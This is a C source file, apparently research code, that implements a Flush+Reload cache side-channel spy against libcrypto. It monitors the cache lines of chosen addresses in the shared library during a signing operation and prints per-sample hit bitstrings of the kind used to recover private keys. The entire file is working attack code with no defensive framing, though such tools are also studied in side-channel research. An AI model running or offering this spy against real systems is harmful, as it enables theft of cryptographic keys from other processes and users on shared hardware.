
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>

#include <fr.h>
#include <pda.h>
#include <util.h>

#define THRESHOLD 100
#define MAX_SAMPLES 100000

static char *libcrypto_fname;
static int samples;
static int slot;
static int nmonitor = 0;

void monitor (fr_t fr, unsigned long addr) {
  fr_monitor(fr, map_offset(libcrypto_fname, addr));
  nmonitor++;
}

int main (int argc, char **argv) {

  fr_t fr = fr_prepare();

  libcrypto_fname = argv[1];
  samples = atoi(argv[2]);
  slot = atoi(argv[3]);

  for (int i = 4; i < argc; i++) {
    unsigned long addr = strtoul(argv[i], NULL, 16);
    monitor(fr, addr);
  }
  
  uint16_t *res = malloc(samples * nmonitor * sizeof(uint16_t));
  for (int i = 0; i < samples * nmonitor ; i+= 4096/sizeof(uint16_t))
    res[i] = 1;
  fr_probe(fr, res);

  // Wait for signature to start
  int dx = 0;
  uint16_t *cur = res;
  int cnt = 0;
  int max = MAX_SAMPLES;

  // Collect samples until we've either collected as many as we need or we
  // hit a threshold and stop anyway
  while (cnt < samples && max--) {
    fr_probe(fr, cur);
    delayloop(slot);
    if (res[0] && res[0] < THRESHOLD) {
      dx = 1;
      max += cnt;
    }
    cnt += dx;
    cur += nmonitor * dx;
  }
  
  int l = cnt;
  for (int i = 0; i < l; i++) {
    for (int j = 0; j < nmonitor; j++) {
      uint16_t val = res[i * nmonitor + j];
      if (val && val < THRESHOLD)
	printf("1");
      else
	printf("0");
    }
    printf("\n");
  }

  free(res);
  fr_release(fr);
  
  return 0;
}
